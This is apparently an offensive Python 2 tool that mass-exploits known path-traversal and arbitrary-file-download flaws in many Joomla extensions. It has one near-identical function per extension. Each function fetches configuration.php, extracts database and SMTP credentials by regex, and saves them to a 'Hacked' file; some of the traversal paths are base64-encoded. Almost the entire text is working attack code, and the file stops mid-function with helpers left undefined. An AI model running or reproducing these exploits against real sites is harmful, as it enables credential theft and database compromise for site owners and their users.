#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
import os
import sys
import re
import urllib
from platform import system
from time import time as timer
os.system('cls' if os.name == 'nt' else 'clear')
print """\033[0;31m

MMMMMMMMMMMMMMMMMMMMM.                             MMMMMMMMMMMMMMMMMMMMM
 `MMMMMMMMMMMMMMMMMMMM           M\  /M           MMMMMMMMMMMMMMMMMMMM'
   `MMMMMMMMMMMMMMMMMMM          MMMMMM          MMMMMMMMMMMMMMMMMMM'  
     MMMMMMMMMMMMMMMMMMM-_______MMMMMMMM_______-MMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMM ╔╦╗┬ ┬┌─┐╔╗ ┌─┐┌┬┐ MMMMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMM  ║ ├─┤├┤ ╠╩╗├─┤ │  MMMMMMMMMMMMMMMMMMMMM    
     .MMMMMMMMMMMMMMMMMMM  ╩ ┴ ┴└─┘╚═╝┴ ┴ ┴  MMMMMMMMMMMMMMMMMMMMM.    
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
                   `MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'                
                          `MMMMMMMMMMMMMMMMMM'                    
                              `MMMMMMMMMM'                              
                                 MMMMMM                            
                                  MMMM     
                                   MM       \033[1;32mCoDe By B1ack-Byt3 🐱‍💻        
                                               \033[0;34m==> Make Everything Easier ❤️❤️ \033[0;m  
""" 
print """               
                    \033[0;31m[Word] Attack With Wordpress\033[0m
                    \033[0;33m[Joom] Attack With Joomla List\033[0m
         
"""
#Exploit Function
def Exploit():
    Logger()
    detect()
    
    


#exploit dork 
def com_hdflvplayer():
    req = requests.get(url + '/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[✔️]\033[0m \033[1;41mFound!!\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        # print " SMTP HOST:",smtphost
        # print " SMTP USER:",smtpuser
        # print " SMTP PASS:",smtppass
        # print " SMTP PORT:",smtpport
        # print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Hacked/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')    

def com_cckjseblod():
    req = requests.get(url + '/index.php?option=com_cckjseblod&task=download&file=configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[✔️]\033[0m \033[1;41mFound!!!\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        # print " SMTP HOST:",smtphost
        # print " SMTP USER:",smtpuser
        # print " SMTP PASS:",smtppass
        # print " SMTP PORT:",smtpport
        # print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Hacked/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')  
	
def com_joomanager():
    req = requests.get(url + '/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[✔️]\033[0m \033[1;41mFound!!!\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        # print " SMTP HOST:",smtphost
        # print " SMTP USER:",smtpuser
        # print " SMTP PASS:",smtppass
        # print " SMTP PORT:",smtpport
        # print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Hacked/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')

def com_aceftp():
    req = requests.get(url + '/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[✔️]\033[0m \033[1;41mFound!!!\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        # print " SMTP HOST:",smtphost
        # print " SMTP USER:",smtpuser
        # print " SMTP PASS:",smtppass
        # print " SMTP PORT:",smtpport
        # print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Hacked/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')

def com_jtagmembersdirectory():
    req = requests.get(url + '/index.php?option=com_jtagmembersdirectory&task=attachment&download_file=/../../../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[✔️]\033[0m \033[1;41mFound!!!\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        # print " SMTP HOST:",smtphost
        # print " SMTP USER:",smtpuser
        # print " SMTP PASS:",smtppass
        # print " SMTP PORT:",smtpport
        # print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Hacked/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')

def com_macgallery():
    req = requests.get(url + '/index.php?option=com_macgallery&view=download&albumid=../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[✔️]\033[0m \033[1;41mFound!!!\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        # print " SMTP HOST:",smtphost
        # print " SMTP USER:",smtpuser
        # print " SMTP PASS:",smtppass
        # print " SMTP PORT:",smtpport
        # print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Hacked/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')

def com_facegallery():
    req = requests.get(url + '/index.php?option=com_facegallery&task=imageDownload&img_name=../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[✔️]\033[0m \033[1;41mFound!!!\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        # print " SMTP HOST:",smtphost
        # print " SMTP USER:",smtpuser
        # print " SMTP PASS:",smtppass
        # print " SMTP PORT:",smtpport
        # print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Hacked/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')

def s5_media_player():
    req = requests.get(url + '/plugins/content/s5_media_player/helper.php?fileurl=../../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[✔️]\033[0m \033[1;41mFound!!!\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        # print " SMTP HOST:",smtphost
        # print " SMTP USER:",smtpuser
        # print " SMTP PASS:",smtppass
        # print " SMTP PORT:",smtpport
        # print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Hacked/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')

def com_docman():
    req = requests.get(url + '/components/com_docman/dl2.php?archive=0&file=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[✔️]\033[0m \033[1;41mFound!!!\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        # print " SMTP HOST:",smtphost
        # print " SMTP USER:",smtpuser
        # print " SMTP PASS:",smtppass
        # print " SMTP PORT:",smtpport
        # print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Hacked/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')

def mod_dvfoldercontent():
    req = requests.get(url + '/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[✔️]\033[0m \033[1;41mFound!!!\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        # print " SMTP HOST:",smtphost
        # print " SMTP USER:",smtpuser
        # print " SMTP PASS:",smtppass
        # print " SMTP PORT:",smtpport
        # print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Hacked/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')

def com_addproperty():
    req = requests.get(url + '/index.php?option=com_addproperty&task=listing&propertyId=73&action=filedownload&fname=../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[✔️]\033[0m \033[1;41mFound!!!\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        # print " SMTP HOST:",smtphost
        # print " SMTP USER:",smtpuser
        # print " SMTP PASS:",smtppass
        # print " SMTP PORT:",smtpport
        # print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Hacked/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')

def com_contushdvideoshare():
    req = requests.get(url + '/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[✔️]\033[0m \033[1;41mFound!!!\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        # print " SMTP HOST:",smtphost
        # print " SMTP USER:",smtpuser
        # print " SMTP PASS:",smtppass
        # print " SMTP PORT:",smtpport
        # print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Hacked/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')

def com_jetext():
    req = requests.get(url + '/index.php?option=com_jetext&task=download&file=../../configuration.phF', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[✔️]\033[0m \033[1;41mFound!!!\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        # print " SMTP HOST:",smtphost
        # print " SMTP USER:",smtpuser
        # print " SMTP PASS:",smtppass
        # print " SMTP PORT:",smtpport
        # print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Hacked/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
